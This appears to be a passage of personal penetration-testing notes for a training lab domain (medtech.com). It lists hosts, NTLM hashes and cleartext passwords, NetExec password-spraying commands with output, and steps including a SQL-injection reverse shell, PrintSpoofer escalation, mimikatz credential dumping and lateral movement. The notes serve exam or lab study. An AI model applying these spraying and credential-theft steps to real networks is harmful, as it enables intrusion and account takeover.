Recently formed IoT healthcare startup.

## Objectives
- Find as many vulnerabilities and misconfigs as possible
- Increase their Active Directory security posture
- Reduce the attack surface

# Hosts
## External
192.168.x.120    proof.txt
192.168.x.121 : WEB02     ~~proof.txt~~
192.168.x.122    local.txt, proof.txt

## Internal
172.16.x.10 : DC            proof.txt
172.16.x.11 : FILES02    ~~local.txt~~, ~~proof.txt~~
172.16.x.12 : DEV04     local.txt, proof.txt
172.16.x.13 : PROD01   proof.txt
172.16.x.14 :    local.txt
172.16.x.82: CLIENT01     proof.txt
172.16.x.83 : CLIENT02    local.txt, proof.txt

# Users & PWs
- joe
	- NTLM - 08d7a47a6f9f66b97b1bae4178747494
		- Flowers1
	- NTLM - 464f388c3fe52a0fa0a6c8926d62059c
- leon - domain admin
- mario
- wario
	- NTLM - b82706aff8acf56b6c325a6c2d8c338a
- peach
- yoshi
	- NTLM - cd21be418f01f5591ac8df1fdeaa54b6
- offsec
- administrator:
	- NTLM - b2c03054c306ac8fc5f9d188710b0168
	- NTLM - f1014ac49bae005ee3ece5f47547d185
	- NTLM - a7c5480e8c1ef0ffec54e99275e6e0f7


```bash
nxc smb 172.16.127.0/24 -u joe -p Flowers1 -d medtech.com
	SMB         172.16.127.13   445    PROD01           [+] medtech.com\joe:Flowers1 
	SMB         172.16.127.10   445    DC01             [+] medtech.com\joe:Flowers1 
	SMB         172.16.127.12   445    DEV04            [+] medtech.com\joe:Flowers1 
	SMB         172.16.127.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
	SMB         172.16.127.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
	SMB         172.16.127.254  445    WEB02            [+] medtech.com\joe:Flowers1 
	SMB         172.16.127.83   445    CLIENT02         [+] medtech.com\joe:Flowers1


nxc ldap 172.16.192.0/24 -d medtech.com -u users.txt -p Mushroom!    
	... 
	LDAP        172.16.192.10   389    DC01             [+] medtech.com\wario:Mushroom!


nxc rdp 172.16.192.0/24 -d medtech.com -u users.txt -p Mushroom!
	RDP         172.16.192.12   3389   DEV04            [+] medtech.com\wario:Mushroom! 
	RDP         172.16.192.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
	...
	RDP         172.16.192.82   3389   CLIENT01         [+] medtech.com\wario:Mushroom! 
	...
	RDP         172.16.192.82   3389   CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)

```



# Methodology

## 121
- Reverse shell from blind SQLi IIS Server on 192.168.x.121
- `whoami /priv` shows SeImpersonate
- `net users /domain` shows users
	- Administrator
	- joe
	- leon
	- mario
	- offsec
	- peach
	- wario
	- yoshi
- `net groups "Domain Admins" /domain` shows leon is domain admin
- `ipconfig` shows it's connected to internal network
- privesc w/ `PrintSpoofer`
- no local - proof.txt is on Admin's Desktop
- mimikatz shows creds:  `joe:Flowers1`
- Tunnel w/ `lingolo`
- Laterally move
	- `nxc smb 172.16.127.0/24 -u joe -p Flowers1 -d medtech.com`
		- `SMB         172.16.127.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)`

## 11